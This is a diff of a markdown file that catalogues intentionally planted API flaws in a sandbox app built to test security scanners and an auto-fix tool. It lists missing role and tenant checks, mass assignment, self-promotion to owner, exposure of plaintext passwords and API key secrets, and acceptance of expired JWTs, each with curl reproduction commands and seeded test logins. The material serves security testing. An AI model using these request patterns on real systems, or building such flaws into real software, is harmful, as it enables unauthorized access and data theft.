@@ -1,110 +1,141 @@
-# Planted vulnerabilities (intentional — test target for PerfAI scan/auto-fix validation)
+# Planted vulnerabilities (intentional — sandbox resembling a real client app)
 
-This app deliberately contains the issues below so a scanner can be checked
-against known-bad code, and later so PerfAI's MCP auto-fix tool can be
-checked against known fixes. Do not "fix" these without instruction — that
-defeats the purpose of this repo.
+This app is a deliberately-vulnerable sandbox built to resemble the shape of a
+real client engagement: a multi-tenant SaaS app with a 6-role RBAC model,
+where role/tenant checks are systemically missing across most endpoints. Do
+not "fix" these without instruction — that defeats the purpose of this repo.
 
-Seed users (see `index.js`): `alice` / `alice123` (role `user`), `bob` /
-`bob123` (role `user`), `admin` / `admin123` (role `admin`).
+## Accounts (seeded in `data.js`)
+
+| Email | Password | Org | Role |
+|---|---|---|---|
+| owner@account1.test | owner123 | org_1 (Account 1) | owner |
+| operator@account1.test | operator123 | org_1 (Account 1) | operator |
+| developer@account1.test | developer123 | org_1 (Account 1) | developer |
+| viewer@account1.test | viewer123 | org_1 (Account 1) | viewer |
+| enduser@account1.test | enduser123 | org_1 (Account 1) | end_user |
+| customer@account1.test | customer123 | org_1 (Account 1) | customer |
+| owner@account2.test | owner123 | org_2 (Account 2) | owner |
+
+Auth: real signed JWT (HS256, `jsonwebtoken`). `POST /api/v1/auth/login`
+with `{email, password}` returns `{token}`. Use it as
+`Authorization: Bearer <token>` on every other route below.
 
 Base URL below is `http://localhost:3000`; swap for
 `https://auto-fix-mcp.onrender.com` to test the deployed instance.
 
 ---
 
-## 1. API2:2023 Broken Authentication
+## 1. API5:2023 Broken Function Level Authorization (BFLA) — systemic, all routes
 
-**Where:** `POST /login`, `decodeToken()` in [index.js](index.js)
+**Where:** every `requireAuth`-protected route in [index.js](index.js). The
+middleware only verifies the token is validly signed — it never checks
+`req.user.role` against the route's intended access.
 
-**What's wrong:** Passwords are stored and compared in plaintext. The
-"token" returned on login is unsigned — just `base64(userId)` — with no
-expiry and no integrity check, so any token is forgeable by anyone who knows
-or guesses a user id. There's also no rate limiting on login attempts.
+**Intended vs actual access:**
 
-**Reproduce — forge another user's token without their password:**
+| Route | Intended roles | Actual |
+|---|---|---|
+| `GET /api/v1/orgs/:orgId` | owner | any role |
+| `PUT /api/v1/orgs/:orgId` | owner | any role |
+| `GET /api/v1/orgs/:orgId/audit-log` | owner, operator | any role |
+| `GET /api/v1/orgs/:orgId/api-keys` | owner, operator | any role |
+| `GET /api/v1/orgs/:orgId/users` | owner, operator | any role |
+| `PUT /api/v1/orgs/:orgId/users/:userId/role` | owner | any role |
+| `GET /api/v1/orgs/:orgId/connectors` | owner, operator, developer | any role |
+| `GET /api/v1/orgs/:orgId/workflows` | owner, operator, developer | any role |
+| `POST /api/v1/orgs/:orgId/workflows/:workflowId/deploy` | owner, operator, developer | any role |
+| `GET /api/v1/orgs/:orgId/usage` | owner | any role |
+| `GET /api/v1/orgs/:orgId/hub-settings` | owner, operator | any role |
+
+**Reproduce — lowest-privilege role (`customer`) reads owner-only audit log:**
 ```sh
-curl -s -X POST http://localhost:3000/login \
+curl -s -X POST http://localhost:3000/api/v1/auth/login \
   -H 'Content-Type: application/json' \
-  -d '{"username":"alice","password":"alice123"}'
-# => {"token":"dTE="}   (dTE= is just base64("u1"))
+  -d '{"email":"customer@account1.test","password":"customer123"}'
+# => {"token":"<JWT>"}
 
-# Forge bob's token with no knowledge of bob's password:
-node -e "console.log(Buffer.from('u2').toString('base64'))"
-# => dTI=
-curl -s http://localhost:3000/notes -H 'Authorization: Bearer dTI='
-# => returns bob's notes, despite never knowing bob's password
+curl -s http://localhost:3000/api/v1/orgs/org_1/audit-log -H 'Authorization: Bearer <JWT>'
+# => 200 OK, full audit trail, even though customer should never see it
 ```
 
 ---
 
-## 2. API1:2023 Broken Object Level Authorization (BOLA / IDOR)
+## 2. API1:2023 Broken Object Level Authorization (BOLA) — cross-tenant
 
-**Where:** `GET /notes/:id` in [index.js](index.js)
+**Where:** same routes as above — none check `req.user.orgId` against the
+`:orgId` in the path, so any account from either tenant can read/write the
+other tenant's data.
 
-**What's wrong:** The handler fetches a note by id and returns it without
-checking that `note.ownerId` matches the requester.
+**Pure BOLA demo (no role mismatch involved):** `GET /api/v1/orgs/:orgId/usage`
+— Account 2's `owner` reads Account 1's `owner`-only usage stats. Same role,
+wrong tenant.
 
-**Reproduce — alice reads bob's private note:**
 ```sh
-curl -s http://localhost:3000/notes/n2 -H 'Authorization: Bearer dTE='
-# => 200 OK, returns bob's "n2" note even though the token is alice's (u1)
+curl -s -X POST http://localhost:3000/api/v1/auth/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"owner@account2.test","password":"owner123"}'
+# => {"token":"<ACCOUNT2_OWNER_JWT>"}
+
+curl -s http://localhost:3000/api/v1/orgs/org_1/usage -H 'Authorization: Bearer <ACCOUNT2_OWNER_JWT>'
+# => 200 OK, returns Account 1's usage/billing data
 ```
 
 ---
 
-## 3. API5:2023 Broken Function Level Authorization — FIXED
+## 3. API3:2023 Mass Assignment
 
-**Where:** `GET /admin/users`, `DELETE /admin/users/:id` in [index.js](index.js)
+**Where:** `PUT /api/v1/orgs/:orgId` in [index.js](index.js) —
+`Object.assign(org, req.body)` applies the entire request body with no
+field allow-list.
 
-**What was wrong:** These routes only checked that *some* valid token was
-presented — never that `user.role === 'admin'`. Any logged-in non-admin
-could call them.
-
-**Fix:** Both routes now reject any authenticated user whose `role` isn't
-`admin` with `403 Forbidden`.
-
-**Previously reproduced with — alice (role `user`) lists and deletes users:**
 ```sh
-curl -s http://localhost:3000/admin/users -H 'Authorization: Bearer dTE='
-# => now 403 Forbidden
-
-curl -s -X DELETE http://localhost:3000/admin/users/u2 -H 'Authorization: Bearer dTE='
-# => now 403 Forbidden
+curl -s -X PUT http://localhost:3000/api/v1/orgs/org_1 \
+  -H 'Authorization: Bearer <ANY_VALID_JWT>' -H 'Content-Type: application/json' \
+  -d '{"plan":"enterprise","billingEmail":"attacker@evil.test"}'
+# => plan and billingEmail overwritten by a non-owner caller
 ```
 
 ---
 
-## 4. API3:2023 Broken Object Property Level Authorization (Excessive Data Exposure)
+## 4. Privilege Escalation
 
-**Where:** `GET /notes`, `GET /admin/users` in [index.js](index.js)
+**Where:** `PUT /api/v1/orgs/:orgId/users/:userId/role` in [index.js](index.js)
+— sets `member.role` directly from the request body with no check on the
+caller's own role.
 
-**What's wrong:** Handlers return raw internal objects via `res.json(...)`
-instead of a filtered DTO, leaking fields the client should never see
-(`password` on users; `ownerId`/`isPrivate` internals on notes).
-
-**Reproduce:**
 ```sh
-curl -s http://localhost:3000/admin/users -H 'Authorization: Bearer dTE='
-# => response includes "password":"bob123" etc. in plaintext
+# Logged in as the lowest-privilege account (customer):
+curl -s -X PUT http://localhost:3000/api/v1/orgs/org_1/users/u6/role \
+  -H 'Authorization: Bearer <CUSTOMER_JWT>' -H 'Content-Type: application/json' \
+  -d '{"role":"owner"}'
+# => customer promotes themself to owner
 ```
 
 ---
 
-## 5. API3:2023 Mass Assignment
+## 5. API3:2023 Excessive Data Exposure
 
-**Where:** `PUT /notes/:id` in [index.js](index.js)
+**Where:** `GET /api/v1/orgs/:orgId/users` and `GET /api/v1/orgs/:orgId/api-keys`
+in [index.js](index.js) — return raw stored objects instead of a filtered DTO.
 
-**What's wrong:** `Object.assign(note, req.body)` applies the entire request
-body to the stored object with no field allow-list, so a client can
-overwrite fields it should never control, such as `ownerId`.
-
-**Reproduce — alice reassigns her own note to bob:**
 ```sh
-curl -s -X PUT http://localhost:3000/notes/n1 \
-  -H 'Authorization: Bearer dTE=' -H 'Content-Type: application/json' \
-  -d '{"title":"hijacked","ownerId":"u2"}'
+curl -s http://localhost:3000/api/v1/orgs/org_1/users -H 'Authorization: Bearer <ANY_VALID_JWT>'
+# => includes each user's plaintext "password" field
 
-curl -s http://localhost:3000/notes/n1 -H 'Authorization: Bearer dTE='
-# => "ownerId":"u2" — alice unilaterally transferred her own note to bob
+curl -s http://localhost:3000/api/v1/orgs/org_1/api-keys -H 'Authorization: Bearer <ANY_VALID_JWT>'
+# => includes raw "secret" values for every API key
 ```
+
+---
+
+## 6. Expired Authorization
+
+**Where:** `requireAuth` in [index.js](index.js) — calls
+`jwt.verify(token, JWT_SECRET, { ignoreExpiration: true })`. The signature is
+genuinely checked (tokens can't be forged without valid credentials), but an
+expired token is still accepted indefinitely.
+
+**Reproduce:** log in, wait past the 1-hour `exp` (or decode/re-sign a token
+with a past `exp` using the same secret if testing locally), then call any
+route with that token — it still succeeds instead of returning 401.
